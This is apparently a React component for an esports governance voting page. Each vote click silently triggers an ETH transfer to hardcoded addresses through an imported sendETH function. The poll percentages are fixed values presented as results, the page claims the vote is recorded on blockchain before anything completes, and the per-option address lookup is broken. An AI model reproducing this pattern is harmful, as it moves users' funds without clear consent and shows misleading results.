import { useState } from "react";
import { CheckCircle, HelpCircle, Vote, Coins, Users, Trophy } from "lucide-react";
import sendETH from '../EthTransfer';

export default function DecentralizedPolicyVotes() {
  const [policies, setQuestions] = useState([
    {
      id: 1,
      question: "Should 30% of tournament revenue be automatically distributed to participating teams through smart contracts?",
      description: "Implement transparent revenue sharing using blockchain technology",
      icon: <Coins className="w-6 h-6 text-purple-400" />,
      options: [
        { text: "Yes - Direct revenue distribution", percentage: 72, selected: false },
        { text: "No - Keep traditional payment systems", percentage: 28, selected: false }
      ],
      answered: false
    },
    {
      id: 2,
      question: "Should team ownership tokens be distributed among players (40%), management (30%), and community (30%)?",
      description: "Decentralize team ownership and decision-making power",
      icon: <Users className="w-6 h-6 text-purple-400" />,
      options: [
        { text: "Yes - Implement token-based ownership", percentage: 65, selected: false },
        { text: "No - Maintain traditional ownership", percentage: 35, selected: false }
      ],
      answered: false
    },
    {
      id: 3,
      question: "Should tournament format changes require a 75% majority vote from both teams and community token holders?",
      description: "Establish decentralized governance for competition rules",
      icon: <Trophy className="w-6 h-6 text-purple-400" />,
      options: [
        { text: "Yes - Community-driven format changes", percentage: 81, selected: false },
        { text: "No - Keep organizer authority", percentage: 19, selected: false }
      ],
      answered: false
    },
    {
      id: 4,
      question: "Should 5% of all tournament prizes be allocated to a community-managed development fund?",
      description: "Create sustainable ecosystem growth through community investment",
      icon: <Coins className="w-6 h-6 text-purple-400" />,
      options: [
        { text: "Yes - Establish community fund", percentage: 68, selected: false },
        { text: "No - Keep full prize distribution", percentage: 32, selected: false }
      ],
      answered: false
    }
  ]);

  const [isLoading, setIsLoading] = useState(false);
  const [loadingProgress, setLoadingProgress] = useState(0);
  const [transactionComplete, setTransactionComplete] = useState(false);
  const [isError, setIsError] = useState(false);

  const handleETHTransfer = async () => {
    console.log("Transaction Started");

    setIsLoading(true);
    setLoadingProgress(0);

    try {
      const result = await sendETH(
        "0xd03ea8624C8C5987235048901fB614fDcA89b117",
        "0x95cED938F7991cd0dFcb48F0a06a40FA1aF46EBC"
      );
      console.log("Transaction Successful:", result);
      setTransactionComplete(true);
      setLoadingProgress(100);
      setTimeout(() => {
        setTransactionComplete(false);
      }, 3000);
    } catch (error) {
      console.error("Transaction Failed:", error);
      setIsError(true);
      setLoadingProgress(0);
    } finally {
      setIsLoading(false);
    }
  };

  const handleSelect = async (policyId, optionIndex) => {
    setQuestions(policies.map(policy => {
      if (policy.id === policyId) {
        const newOptions = policy.options.map((opt, idx) => ({
          ...opt,
          selected: idx === optionIndex
        }));
        
        // Get the selected option's address
        const selectedAddress = policy.options[optionIndex].address;
        
        // Trigger ETH transfer
        handleETHTransfer(selectedAddress);

        return {
          ...policy,
          options: newOptions,
          answered: true,
          transactionComplete: true
        };
      }
      return policy;
    }));
  };

  return (
    <div className="min-h-screen p-8">
      <div className="max-w-4xl mx-auto">
        <h1 className="text-4xl font-bold mb-8 text-white flex items-center gap-3">
          <Vote className="text-purple-400" />
          Decentralized Esports Governance
        </h1>
        
        <div className="space-y-8">
          {policies.map((policy) => (
            <div key={policy.id} className="bg-black/50 backdrop-blur-md p-8 rounded-2xl border border-purple-500/20">
              <div className="flex items-start gap-4 mb-6">
                {policy.icon}
                <div>
                  <h2 className="text-2xl font-bold text-white">{policy.question}</h2>
                  <p className="text-gray-400 mt-2">{policy.description}</p>
                </div>
              </div>
              
              <div className="space-y-4">
                {policy.options.map((option, index) => (
                  <div
                    key={index}
                    onClick={() => !policy.answered && handleSelect(policy.id, index)}
                    className={`
                      cursor-pointer group bg-slate-800/50 p-6 rounded-xl 
                      ${!policy.answered && 'hover:bg-slate-800'} 
                      ${option.selected && 'ring-2 ring-purple-500'}
                      transition-all relative overflow-hidden
                    `}
                  >
                    <div className="flex justify-between items-center relative z-10">
                      <div className="flex items-center gap-2">
                        <h3 className="text-xl font-bold text-white">{option.text}</h3>
                      </div>
                      {policy.answered && (
                        <span className="text-purple-400 font-bold">
                          {option.percentage}%
                        </span>
                      )}
                    </div>
                    
                    {policy.answered && (
                      <div 
                        className="absolute left-0 top-0 h-full bg-purple-500/20 transition-all duration-1000"
                        style={{ width: `${option.percentage}%` }}
                      />
                    )}
                  </div>
                ))}
              </div>
              
              {policy.answered && (
                <div className="mt-4 space-y-2">
                  <div className="flex items-center gap-2 text-green-400">
                    <CheckCircle className="w-5 h-5" />
                    <span>Vote recorded on blockchain</span>
                  </div>
                  {isLoading && (
                    <div className="flex items-center gap-2 text-purple-400">
                      <div className="animate-spin rounded-full h-4 w-4 border-2 border-purple-500 border-t-transparent" />
                      <span>Processing transaction...</span>
                    </div>
                  )}
                  {transactionComplete && (
                    <div className="flex items-center gap-2 text-green-400">
                      <CheckCircle className="w-5 h-5" />
                      <span>Transaction complete</span>
                    </div>
                  )}
                  {isError && (
                    <div className="flex items-center gap-2 text-red-400">
                      <span>Transaction failed. Please try again.</span>
                    </div>
                  )}
                </div>
              )}
            </div>
          ))}
        </div>
      </div>
    </div>
  );
}